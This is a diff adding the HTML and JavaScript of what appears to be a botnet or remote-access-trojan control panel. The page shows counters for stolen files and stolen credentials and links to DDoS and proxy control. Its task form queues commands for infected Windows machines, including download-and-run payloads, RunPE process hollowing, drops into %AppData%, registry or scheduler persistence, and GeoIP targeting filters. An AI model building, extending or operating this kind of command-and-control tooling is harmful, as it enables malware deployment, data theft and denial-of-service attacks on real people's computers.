@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<!--
+This is a starter template page. Use this page to start your new project from
+scratch. This page gets rid of all links and provides the needed markup only.
+-->
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>{{.Name}} | On-Connection Tasks</title>
+
+    <!-- Google Font: Source Sans Pro -->
+    <link rel="stylesheet"
+          href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="../static/css/all.min.css">
+    <!-- Theme style -->
+    <link rel="stylesheet" href="../static/css/adminlte.min.css">
+
+    <link rel="stylesheet" href="../static/css/toastr.min.css">
+    <link href="../static/css/adminlte.min.css" rel="stylesheet">
+    <link href="../static/css/dataTables.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/responsive.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/sweetalert2.css" rel="stylesheet">
+    <link href="../static/css/buttons.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/responsive.bootstrap4.min.css" rel="stylesheet">
+    <link href="../static/css/select.bootstrap4.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../static/css/bootstrap-datetimepicker-build.css">
+
+</head>
+<body class="hold-transition dark-mode sidebar-mini">
+<div class="wrapper">
+
+    <!-- Navbar -->
+    <nav class="main-header navbar navbar-expand navbar-gray-dark navbar-dark">
+        <!-- Left navbar links -->
+        <ul class="navbar-nav">
+            <li class="nav-item">
+                <a class="nav-link" data-widget="pushmenu" href="#" role="button"><i class="fas fa-bars"></i></a>
+            </li>
+
+        </ul>
+
+        <!-- Right navbar links -->
+        <ul class="navbar-nav ml-auto">
+
+            <li class="nav-item">
+                <a class="nav-link" data-widget="fullscreen" href="#" role="button">
+                    <i class="fas fa-expand-arrows-alt"> Full Screen</i>
+                </a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" href="../logout" role="button"><i class="fas fa-sign-out-alt"> Logout</i></a>
+            </li>
+        </ul>
+    </nav>
+    <!-- /.navbar -->
+
+    <!-- Main Sidebar Container -->
+    <aside class="main-sidebar sidebar-dark-primary elevation-4">
+        <!-- Brand Logo -->
+        <a href="./" class="brand-link">
+
+            <span class="brand-text font-weight-light"><center>{{.Name}}</center></span>
+        </a>
+
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <!-- Sidebar user panel (optional) -->
+            <div class="user-panel mt-3 pb-3 mb-3 d-flex">
+                <div class="image">
+                    <img src="../static/images/avatar6.jpg" class="img-circle elevation-2" alt="User Image">
+                </div>
+                <div class="info">
+                    <a class="d-block">{{.Username}}</a>
+                </div>
+            </div>
+
+
+            <!-- Sidebar Menu -->
+            <nav class="mt-2">
+                <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu"
+                    data-accordion="false">
+                    <!-- Add icons to the links using the .nav-icon class
+                         with font-awesome or any other icon font library -->
+                    <li class="nav-item">
+                        <a href="./" class="nav-link">
+                            <i class="nav-icon fas fa-tachometer-alt"></i>
+                            <p>
+                                Dashboard
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item menu-close">
+                        <a href="#" class="nav-link">
+                            <i class="nav-icon fas fa-users"></i>
+                            <p>
+                                Clients
+                            </p>
+                        </a>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="../clients/windows" class="nav-link">
+                                    <i class="nav-icon fab fa-windows"></i>
+                                    <p>Windows</p>
+                                </a>
+                            </li>
+                             <li class="nav-item">
+                                <a href="../clients/linux" class="nav-link">
+                                  <i class="fab fa-linux nav-icon"></i>
+                                  <p>Linux</p>
+                                </a>
+                              </li>
+                        </ul>
+                        <li class="nav-item">
+                        <a href="../ddos" class="nav-link">
+                            <i class="nav-icon fas fa-network-wired"></i>
+                            <p>
+                                DDoS Control
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="../socks" class="nav-link">
+                            <i class="nav-icon fas fa-project-diagram"></i>
+                            <p>
+                                Socks & Proxies
+                            </p>
+                        </a>
+                    </li>
+
+                    <li class="nav-item menu-open">
+                        <a href="#" class="nav-link">
+                            <i class="nav-icon fas fa-tasks"></i>
+                            <p>
+                                Task Management
+                            </p>
+                        </a>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="./tasks" class="nav-link">
+                                    <i class="nav-icon fas fa-list-ul"></i>
+                                    <p>
+                                       General Tasks
+                                    </p>
+                                </a>
+                            </li>
+                        </ul>
+                        <ul class="nav nav-treeview">
+                            <li class="nav-item">
+                                <a href="./onconnect" class="nav-link active">
+                                    <i class="nav-icon fas fa-ethernet"></i>
+                                    <p>
+                                        On-Connection Tasks<i class="right fas fa-angle-left"></i>
+                                    </p>
+                                </a>
+                            </li>
+                        </ul>
+                    <li class="nav-item">
+                        <a href="../ddos" class="nav-link">
+                            <i class="nav-icon fas fa-network-wired"></i>
+                            <p>
+                                DDoS Control
+                            </p>
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="./settings" class="nav-link">
+                            <i class="nav-icon fas fa-cogs"></i>
+                            <p>
+                                Settings
+                            </p>
+                        </a>
+                    </li>
+                </ul>
+            </nav>
+            <!-- /.sidebar-menu -->
+        </div>
+        <!-- /.sidebar -->
+    </aside>
+
+    <!-- Content Wrapper. Contains page content -->
+    <div class="content-wrapper">
+        <!-- Content Header (Page header) -->
+        <div class="content-header">
+            <div class="container-fluid">
+                <div class="row mb-2">
+                    <div class="col-sm-6">
+                        <h1><i class="fas fa-ethernet"></i> On-Connection Tasks</h1>
+                    </div><!-- /.col -->
+                    <div class="col-sm-6">
+                    </div><!-- /.col -->
+                </div><!-- /.row -->
+            </div><!-- /.container-fluid -->
+        </div>
+        <!-- /.content-header -->
+
+        <!-- Main content -->
+        <div class="content">
+            <div class="container-fluid">
+                <!-- Info boxes -->
+                <div class="row">
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-heart"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Active Clients</span> <span class="info-box-number">{{.ActiveClients}}</span>
+                            </div><!-- /.info-box-content -->
+                        </div><!-- /.info-box -->
+                    </div><!-- /.col -->
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box mb-3">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-archive"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Stolen Files</span> <span class="info-box-number">{{.StolenFiles}}</span>
+                            </div><!-- /.info-box-content -->
+                        </div><!-- /.info-box -->
+                    </div><!-- /.col -->
+                    <!-- fix for small devices only -->
+                    <div class="clearfix hidden-md-up"></div>
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box mb-3">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-key"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Stolen Credentials</span> <span class="info-box-number">{{.StolenCredentials}}</span>
+                            </div><!-- /.info-box-content -->
+                        </div><!-- /.info-box -->
+                    </div><!-- /.col -->
+                    <div class="col-12 col-sm-6 col-md-3">
+                        <div class="info-box mb-3">
+                            <span class="info-box-icon bg-dark elevation-1"><i class="fas fa-database"></i></span>
+                            <div class="info-box-content">
+                                <span class="info-box-text">Total Clients</span> <span class="info-box-number">{{.TotalClients}}</span>
+                            </div><!-- /.info-box-content -->
+                        </div><!-- /.info-box -->
+                    </div><!-- /.col -->
+                </div><!-- /.row -->
+                <div class="card card-primary card-outline">
+                    <div class="card-header">
+                        <h3 class="card-title">
+                            <i class="fas fa-ethernet"></i> Tasks
+                        </h3>
+                        <div class="card-tools">
+                           <code>On New Client Connection Tasks will be run from oldest to newest. Remove Tasks you don't want to run.</code>
+                        </div>
+                    </div>
+                    <div class="card-body">
+                        <table class="table table-striped table-borderless dark-mode" id="taskTable">
+                            <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Date Issued</th>
+                                <th>Command Name</th>
+                                <th>Executions</th>
+                                <th>Options</th>
+                            </tr>
+                            </thead>
+                            <tbody>
+
+                            {{ range .TaskTables}}
+
+                            <tr>
+                                <td>{{.TaskName}}</td>
+                                <td>{{.CommandDate}}</td>
+                                <td>{{.CommandName}}</td>
+                                <td>{{.Executions}}</td>
+                                <td>
+                                    <center>
+                                        <a class="btn btn-primary btn-flat" name="{{.TaskID}}"
+                                           onclick="deleteTask(this)" href="#"><i
+                                                class="fas fa-lg fa-trash-alt"></i></a>
+                                    </center>
+                                </td>
+                            </tr>
+
+                            {{ end}}
+
+                            </tbody>
+                        </table>
+                        <br>
+                        <center>
+                            <div class="col-lg-11">
+                                <div class="card card-info">
+                                    <div class="card-header">
+                                        <h3 class="card-title">Task Creation</h3>
+                                        <div class="card-tools">
+                                            <button class="btn btn-info bg-gradient-primary"
+                                                    data-target="#modal-default" data-toggle="modal" type="button"><i
+                                                    class="fa fa-question"></i></button>
+                                        </div>
+                                    </div>
+                                    <!-- /.card-header -->
+                                    <!-- form start -->
+                                    <form action="../tasks/windows/new" class="form-horizontal" id="newtask"
+                                          method="post" name="newtask">
+                                        <div class="card-body">
+                                            <div class="input-group mb-3">
+                                                <div class="input-group-prepend">
+                                                    <span class="input-group-text">Name</span>
+                                                </div>
+                                                <input type="text" class="form-control" id="taskname"
+                                                       placeholder="Example Task" value="Example Task">
+                                                &nbsp;
+                                                <div class="input-group-prepend">
+                                                    <span class="input-group-text">Command</span>
+                                                </div>
+                                                <select class="custom-select" id="commandSelect" name="commandSelect">
+                                                    <option disabled selected value="">
+                                                        Select a Command
+                                                    </option>
+                                                    <optgroup label="Client Commands">
+                                                        <option data-rn="Kill Client" value="0xKC">
+                                                            Kill Client
+                                                        </option>
+                                                        <option data-rn="Uninstall Client" value="0xUNC">
+                                                            Uninstall Client
+                                                        </option>
+                                                        <option data-rn="Update Client" value="0xUCxP">
+                                                            Update Client
+                                                        </option>
+                                                    </optgroup>
+                                                    <optgroup label="Normal Commands">
+                                                        <option data-rn="Open URL" value="0xOUxPH">
+                                                            Open URL
+                                                        </option>
+                                                        <option data-rn="Start Process" value="0xSPxPH">
+                                                            Start Process
+                                                        </option>
+                                                        <option data-rn="Download and Run" value="0xDPR">
+                                                            Download and Run
+                                                        </option>
+                                                    </optgroup>
+                                                    <optgroup label="Power Commands">
+                                                        <option data-rn="Shutdown" value="0xS">
+                                                            Shutdown
+                                                        </option>
+                                                        <option data-rn="Restart" value="0xr">
+                                                            Restart
+                                                        </option>
+                                                        <option data-rn="Lock" value="0xL">
+                                                            Lock
+                                                        </option>
+                                                    </optgroup>
+                                                </select>
+
+                                            </div>
+                                            <div class="form-group" id="hidden">
+                                                <div class="form-group">
+                                                    <div class="custom-control-inline custom-switch">
+                                                        <input type="checkbox" class="custom-control-input"
+                                                               id="hiddencheck">
+                                                        <label class="custom-control-label"
+                                                               for="hiddencheck">Hidden</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="form-group" id="hidden2">
+                                                <div class="form-group">
+                                                    <div class="custom-control-inline custom-switch float-left">
+                                                        <input type="checkbox" class="custom-control-input" id="runpe">
+                                                        <label class="custom-control-label float-right" name="runpe"
+                                                               onclick="downloadnrunPE()" for="runpe">RunPE</label>
+                                                    </div>
+                                                    <div class="custom-control-inline custom-switch float-middle">
+                                                        <input type="checkbox" class="custom-control-input"
+                                                               id="customL">
+                                                        <label class="custom-control-label" onclick="customdrop()"
+                                                               name="customL" for="customL">Custom Drop Location</label>
+                                                    </div>
+                                                    <div class="custom-control-inline custom-switch float-right">
+                                                        <input type="checkbox" class="custom-control-input"
+                                                               id="startup">
+                                                        <label class="custom-control-label float-right" name="startup"
+                                                               onclick="downloadnrunSta()" for="startup">Add to
+                                                            Startup</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="form-group" id="hiddenS">
+                                                <div class="form-group">
+                                                    <label>Startup Method</label>
+                                                    <select class="form-control" id="startupmethod"
+                                                            name="startupmethod">
+                                                        <option value="HKCU">
+                                                            Current Version Run
+                                                        </option>
+                                                        <option value="HKCUO">
+                                                            Current Version Run Once
+                                                        </option>
+                                                        <option value="SCHTASKS">
+                                                            Task Scheduler
+                                                        </option>
+                                                        <option value="SCHTASKS">
+                                                            Startup Folder
+                                                        </option>
+                                                    </select> <!-- IP mask -->
+                                                </div>
+                                            </div>
+                                            <div class="form-group" id="hiddenR">
+                                                <div class="input-group mb-3">
+                                                    <div class="input-group-prepend">
+                                                        <span class="input-group-text">Host Program</span>
+                                                    </div>
+                                                    <input type="text" class="form-control" id="hostpath"
+                                                           name="hostpath" placeholder="C:\Windows\SysWOW64\calc.exe"
+                                                           value="C:\Windows\SysWOW64\calc.exe">
+                                                </div>
+                                            </div>
+                                            <div class="form-group" id="hiddenL">
+                                                <div class="input-group mb-3">
+                                                    <div class="input-group-prepend">
+                                                        <span class="input-group-text">Drop Location</span>
+                                                    </div>
+                                                    <input type="text" class="form-control" id="drop" name="drop"
+                                                           placeholder="%AppData%" value="%AppData%">
+                                                </div>
+                                            </div>
+                                            <div class="form-group" id="param">
+                                                <textarea class="form-control" id="cparam" placeholder="Parameters"
+                                                          rows="3"></textarea>
+                                            </div>
+
+                                            <div class="row">
+                                                <div class="col-lg-6">
+                                                    <div class="card card-primary card-outline">
+                                                        <div class="card-header ">
+                                                            <h5 class="m-0 float-left">Filter </h5>
+                                                            <div class="float-right"><input type="checkbox"
+                                                                                            name="filterCheck"
+                                                                                            id="filterCheck"
+                                                                                            onclick="hiddenFilter()"
+                                                                                            data-bootstrap-switch></div>
+                                                        </div>
+                                                        <div class="card-body">
+                                                            <div class="form-group" id="hiddenFilter">
+                                                                <div class="input-group mb-3">
+                                                                    <div class="input-group-prepend">
+                                                                        <span class="input-group-text">Method</span>
+                                                                    </div>
+                                                                    <select class="custom-select" id="filterMethod"
+                                                                            name="filterMethod">
+                                                                        <option disabled selected value="">
+                                                                            Select a Filter Method
+                                                                        </option>
+                                                                        <optgroup label="GeoIP">
+                                                                            <option data-rn="In Country" value="0xIC">
+                                                                                If in Country
+                                                                            </option>
+                                                                        </optgroup>
+                                                                        <!--     <optgroup label="Operating System">
+                                                                               <option data-rn="Windows 10" value="0xW10">
+                                                                                 If Windows 10
+                                                                               </option>
+                                                                               <option data-rn="Windows 8" value="0xW8">
+                                                                                 If Windows 8
+                                                                               </option>
+                                                                               <option data-rn="Windows 7" value="0xW7">
+                                                                                 If Windows 7
+                                                                               </option>
+                                                                               <option data-rn="Windows Vista" value="0xWV">
+                                                                                 If Windows Vista or Lower
+                                                                               </option>
+                                                                             </optgroup> -->
+                                                                        <!--  <optgroup label="Software">
+                                                                            <option data-rn="Has Software" value="0xSW">
+                                                                              If Installed
+                                                                            </option>
+                                                                          </optgroup> -->
+                                                                        <!--         <optgroup label="Hardware">
+                                                                                   <option data-rn="Has GPU" value="0xGPU">
+                                                                                     If has Video Card
+                                                                                   </option>
+                                                                                   <option data-rn="Has GPU 4GB" value="0xGPV4G">
+                                                                                     If has Video Card 4GB+
+                                                                                   </option>
+                                                                                   <option data-rn="Has GPU 6GB" value="0xGPV6G">
+                                                                                     If has Video Card 6GB+
+                                                                                   </option>
+
+                                                                                 </optgroup> -->
+                                                                        <!-- <optgroup label="Special">
+                                                                           <option data-rn="FirstConnection" value="First">
+                                                                             On First Connection
+                                                                           </option>
+                                                                         </optgroup> -->
+                                                                    </select>
+
+                                                                </div>
+                                                                <div class="form-group" id="hiddenC">
+                                                                    <div class="input-group mb-3">
+                                                                        <div class="input-group-prepend">
+                                                                            <span class="input-group-text">Country Code</span>
+                                                                        </div>
+                                                                        <input type="text" class="form-control"
+                                                                               id="country" name="country"
+                                                                               placeholder="us" value="us">
+                                                                    </div>
+                                                                </div>
+                                                                <!--  <div class="form-group" id="hiddenI">
+                                                                    <div class="input-group mb-3">
+                                                                      <div class="input-group-prepend">
+                                                                        <span class="input-group-text">Installed</span>
+                                                                      </div>
+                                                                      <input type="text" class="form-control"  id="installed" name="installed" placeholder="photoshop" value="photoshop">
+                                                                    </div>
+                                                                  </div> -->
+                                                                <div class="custom-control-inline custom-switch float-right">
+                                                                    <input type="checkbox" class="custom-control-input"
+                                                                           id="admin">
+                                                                    <label class="custom-control-label float-right"
+                                                                           name="admin" for="admin">Admin Only</label>
+                                                                </div>
+                                                                <!--   <div class="custom-control-inline custom-switch float-left">
+                                                                     <input type="checkbox" class="custom-control-input"  id="x64">
+                                                                     <label class="custom-control-label float-left" name="x64"  for="x64">64Bit Only</label>
+                                                                   </div> -->
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+
+                                        <div class="card-footer">
+                                            <button class="btn btn-primary icon-btn float-left" type="submit"><i
+                                                    class="fas fa-fw fa-lg fa-plus"></i> Add Task
+                                            </button>
+                                            &nbsp;<a class="btn btn-primary icon-btn float-right" href="#"
+                                                     onclick="resetForm()"><i
+                                                class="fa fa-fw fa-lg fa-times-circle"></i> Clear Form</a>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                        </center>
+
+                    </div>
+                </div>
+
+            </div><!-- /.container-fluid -->
+        </div>
+        <!-- /.content -->
+    </div>
+    <!-- /.content-wrapper -->
+
+
+    <!-- Main Footer -->
+    <footer class="main-footer">
+        <!-- To the right -->
+        <div class="float-right d-none d-sm-inline">
+            https://github.com/SaturnsVoid
+        </div>
+        <!-- Default to the left -->
+        <strong><i>"I'm very much a creature of habit."</i> </strong> - Eminem
+    </footer>
+</div>
+<!-- ./wrapper -->
+<div class="modal fade" id="modal-default">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title">Task Creation Help</h4>
+                <button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">&times;</span>
+                </button>
+            </div>
+            <div class="modal-body">
+
+            </div>
+            <div class="modal-footer justify-content-between">
+                <button class="btn btn-default" data-dismiss="modal" type="button">Close</button>
+            </div>
+        </div>
+        <!-- /.modal-content -->
+    </div>
+    <!-- /.modal-dialog -->
+</div>
+<!-- REQUIRED SCRIPTS -->
+
+<!-- jQuery -->
+
+<script src="../static/js/jquery.min.js"></script>
+<!-- Bootstrap 4 -->
+<script src="../static/js/bootstrap.bundle.min.js"></script>
+<script src="../static/js/jquery.dataTables.min.js">
+</script>
+<script src="../static/js/dataTables.bootstrap4.min.js">
+</script>
+<script src="../static/js/dataTables.buttons.min.js"></script>
+<!-- AdminLTE App -->
+<script src="../static/js/adminlte.min.js"></script>
+<script src="../static/js/pdfmake.min.js">
+</script>
+<script src="../static/js/buttons.bootstrap4.min.js">
+</script>
+<script src="../static/js/sweetalert2.min.js"></script>
+<script src="../static/js/toastr.min.js"></script>
+<!-- Bootstrap Switch -->
+<script src="../static/js/bootstrap-switch.min.js"></script>
+<script src="../static/js/moment.min.js" type="text/javascript"></script>
+<script src="../static/js/dataTables.select.min.js">
+</script>
+<script src="../static/js/buttons.html5.min.js">
+</script>
+<script src="../static/js/bootstrap-datetimepicker.js"></script>
+
+<script>
+
+    function resetForm() {
+        jQuery("#param").hide()
+        jQuery("#dos").hide()
+        jQuery("#hidden").hide()
+        jQuery("#hidden2").hide()
+        jQuery("#runpecheck").hide()
+        jQuery("#hiddenR").hide()
+        jQuery("#hiddenS").hide()
+        jQuery("#hiddenFilter").hide()
+        jQuery("#hiddenC").hide()
+        jQuery("#hiddenI").hide()
+        jQuery("#hiddenL").hide()
+        jQuery("#hiddenSchedule").hide()
+
+
+        document.getElementById("newtask").reset();
+    }
+
+    jQuery(function () {
+        jQuery("#param").hide()
+        jQuery("#hidden").hide()
+        jQuery("#hidden2").hide()
+        jQuery("#runpecheck").hide()
+        jQuery("#hiddenR").hide()
+        jQuery("#hiddenS").hide()
+        jQuery("#hiddenFilter").hide()
+        jQuery("#hiddenC").hide()
+        jQuery("#hiddenI").hide()
+        jQuery("#hiddenL").hide()
+        jQuery("#hiddenSchedule").hide()
+
+
+        $("input[data-bootstrap-switch]").each(function () {
+            $(this).bootstrapSwitch('state', $(this).prop('checked'));
+        })
+
+        $('#timeoutTime').datetimepicker({
+            format: 'DD MMM YY HH:mm ZZ',
+            icons: {
+                time: 'far fa-clock'
+            }
+        });
+
+        $('#scheduleTime').datetimepicker({
+            format: 'DD M YY HH:mm ZZ',
+            icons: {
+                time: 'far fa-clock'
+            }
+        });
+//var rc = event.target.options[event.target.selectedIndex].dataset.rc;
+    });
+    $('#filterCheck').on('switchChange.bootstrapSwitch', function (e, data) {
+        if ($("#filterCheck").bootstrapSwitch('state') === true) {
+            $("#hiddenFilter").show();
+        } else {
+            jQuery("#hiddenFilter").hide()
+        }
+    });
+
+    function deleteTask(ID) {
+        var id = ID.name
+        Swal.fire({
+            title: 'Delete this Task?',
+            html: "<h3>Are you sure that you want to delete this task?",
+            showCancelButton: true,
+            confirmButtonText: `Delete`,
+        }).then((result) => {
+            if (result.isConfirmed) {
+                $.ajax({
+                    url: '../delete/task/windows',
+                    type: 'POST',
+                    data: 'id=' + id,
+                    dataType: 'json'
+                })
+                Swal.fire('Deleted!', 'The Task was deleted.', 'success')
+                setTimeout("location.reload(true);", 2000);
+            } else if (result.dismiss) {
+                Swal.fire('Canceled', 'Nothing lost... Accept maybe some time.', 'info')
+                setTimeout("location.reload(true);", 2000);
+            }
+        })
+    }
+
+    function triggerCheck() {
+        var scheduleCheck = document.getElementById("triggerCheck");
+
+        if (scheduleCheck.checked == true) {
+            //jQuery("#hiddenSchedule").hide()
+        } else {
+            // $("#hiddenSchedule").show();
+        }
+    }
+
+    function scheduleCheck() {
+        var scheduleCheck = document.getElementById("scheduleCheck");
+
+        if (scheduleCheck.checked == true) {
+            jQuery("#hiddenSchedule").hide()
+        } else {
+            $("#hiddenSchedule").show();
+        }
+    }
+
+
+    function customdrop() {
+        var custdrop = document.getElementById("customL");
+
+        if (custdrop.checked == true) {
+            jQuery("#hiddenL").hide()
+        } else {
+            $("#hiddenL").show();
+        }
+    }
+
+
+    function downloadnrunPE() {
+        var runpehost = document.getElementById("runpe");
+
+        if (runpehost.checked == true) {
+            jQuery("#hiddenR").hide()
+        } else {
+            $("#hiddenR").show();
+        }
+    }
+
+    function downloadnrunSta() {
+        var startupmeth = document.getElementById("startup");
+
+        if (startupmeth.checked == true) {
+            jQuery("#hiddenS").hide()
+        } else {
+            $("#hiddenS").show();
+        }
+    }
+
+    jQuery("#commandSelect").change(function () {
+        var value = jQuery(this).val();
+        if (value.includes("P")) {
+            $("#param").show();
+        } else {
+            jQuery("#param").hide()
+        }
+        if (value.includes("H")) {
+            $("#hidden").show();
+        } else {
+            jQuery("#hidden").hide()
+        }
+        if (value.includes("R")) {
+            $("#hidden2").show();
+        } else {
+            jQuery("#hidden2").hide()
+        }
+        if (value.includes("E")) {
+            $("#runpecheck").show();
+        } else {
+            jQuery("#runpecheck").hide()
+        }
+    });
+
+    jQuery("#filterMethod").change(function () {
+        var value = jQuery(this).val();
+        if (value.includes("0xSW")) {
+            $("#hiddenI").show();
+        } else {
+            jQuery("#hiddenI").hide()
+        }
+        if (value.includes("0xIC")) {
+            $("#hiddenC").show();
+        } else {
+            jQuery("#hiddenC").hide()
+        }
+    });
+
+    $(function () {
+        $("#taskTable").DataTable({
+            "responsive": true, "lengthChange": false, "autoWidth": false, "order": [[2, "desc"]],
+            select: {
+                style: 'multi'
+            },
+            buttons: [
+                {
+                    extend: 'collection',
+                    text: '<i class="fas fa-file-download"> Export<\/i>',
+                    buttons: [
+                        {
+                            extend: 'copyHtml5',
+                            text: '<i class="far fa-copy"> Copy<\/i>',
+                            titleAttr: 'Copy'
+                        },
+                        {
+                            extend: 'csvHtml5',
+                            text: '<i class="fa fa-table"> CVS<\/i>',
+                            titleAttr: 'CVS'
+                        }
+                    ]
+                }
+            ]
+        }).buttons().container().appendTo('#taskTable_wrapper .col-md-6:eq(0)');
+
+    });
+
+    $('#newtask').submit(function (event) {
+        console.log("newtask called")
+        event.preventDefault();
+
+        var taskName = $("#taskname").val();
+
+        var selectedCommand = $("#commandSelect").val();
+        var sel = document.getElementById('commandSelect');
+        var selected = sel.options[sel.selectedIndex];
+        var realname = selected.getAttribute('data-rn');
+
+
+        var hiddencheck;
+        if ($("#hiddencheck").is(":checked")) {
+            hiddencheck = "true";
+        } else {
+            hiddencheck = "false";
+        }
+
+        var runpe;
+        if ($("#runpe").is(":checked")) {
+            runpe = "true";
+        } else {
+            runpe = "false";
+        }
+        var hostPath = $("#hostpath").val();
+
+        var customL;
+        if ($("#customL").is(":checked")) {
+            customL = "true";
+        } else {
+            customL = "false";
+        }
+        var dropPath = $("#drop").val();
+
+        var startup;
+        if ($("#startup").is(":checked")) {
+            startup = "true";
+        } else {
+            startup = "false";
+        }
+
+        var startUpMethod = $("#startupmethod").val();
+
+
+        var commandPara = $("#cparam").val();
+
+        var filterMethod = $("#filterMethod").val();
+        var countyCode = $("#country").val();
+        //var installed = $("#installed").val();
+
+        var admin;
+        if ($("#admin").is(":checked")) {
+            admin = "true";
+        } else {
+            admin = "false";
+        }
+
+        // var x64;
+        //if ($("#x64").is(":checked")) {
+        //  x64 = "true";
+        //} else {
+        //   x64 = "false";
+        // }
+
+        var maxExecutions = $("#mExecutions").val();
+        var taskTimeout = $("#timeoutTime").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../tasks/windows/new",
+            // data: "tname=" +taskName + "&cname=" + selectedCommand + "&rname=" + realname + "&hidden=" + hiddencheck + "&runpe=" + runpe +"&host=" + hostPath + "&clo="+ customL + "&path="+ dropPath + "&startup=" + startup + "&method=" + startUpMethod + "&cpara=" + commandPara + "&filter=" + filterMethod + "&country=" + countyCode + "&installed=" + installed + "&admin=" + admin + "&64=" + x64 + "&max=" + maxExecutions + "&timeout=" + taskTimeout,
+
+            data: "tname=" + taskName + "&cname=" + selectedCommand + "&rname=" + realname + "&hidden=" + hiddencheck + "&runpe=" + runpe + "&host=" + hostPath + "&clo=" + customL + "&path=" + dropPath + "&startup=" + startup + "&method=" + startUpMethod + "&cpara=" + commandPara + "&filter=" + filterMethod + "&country=" + countyCode + "&admin=" + admin + "&max=" + maxExecutions + "&timeout=" + taskTimeout,
+            success: function (text) {
+                console.log(text)
+                if (text == "success") {
+                    Swal.fire('Task Created!', 'The task was created and command are being issued to the clients!', 'success')
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire('Oops...', 'Something went wrong but nothing was lost.', 'error');
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", 'Unknown Error: ' + text, "error")
+                }
+            }
+        });
+    });
+
+
+    toastr.options = {
+        "closeButton": true,
+        "debug": false,
+        "newestOnTop": true,
+        "progressBar": true,
+        "positionClass": "toast-top-right",
+        "preventDuplicates": true,
+        "onclick": null,
+        "showDuration": "300",
+        "hideDuration": "1000",
+        "timeOut": "5000",
+        "extendedTimeOut": "1000",
+        "showEasing": "swing",
+        "hideEasing": "linear",
+        "showMethod": "fadeIn",
+        "hideMethod": "fadeOut"
+    }
+    window.onload = function () {
+        let conn;
+        let last;
+
+        if (window["WebSocket"]) {
+            conn = new WebSocket("wss://" + document.location.host + "/live");
+            conn.onopen = function () {
+                console.log("Live Agent: Connected");
+                conn.send("ping");
+            };
+            conn.onclose = function (evt) {
+                console.log("Live Agent: Connection Closed (" + evt.code + ")");
+            };
+            conn.onmessage = function (evt) {
+                if (evt.data.length >= 1) {
+                    if(evt.data === "pong") {
+                        setTimeout(function(){
+                            conn.send("ping");
+                        }, 2000);
+                    }else{
+                        if (evt.data !== last) {
+                            last = evt.data;
+                            const words = evt.data.split("|");
+                            if (words[0] === "info") {
+                                toastr.info(words[1], words[2]);
+                            }
+                            if (words[0] === "success") {
+                                toastr.success(words[1], words[2]);
+                            }
+                            if (words[0] === "error") {
+                                toastr.error(words[1], words[2]);
+                            }
+                        }
+                    }
+                }
+            };
+        } else {
+            alert("Your browser does not support WebSockets. Do to this you will not get Live Notifications.");
+        }
+    };
+</script>
+</body>
+</html>
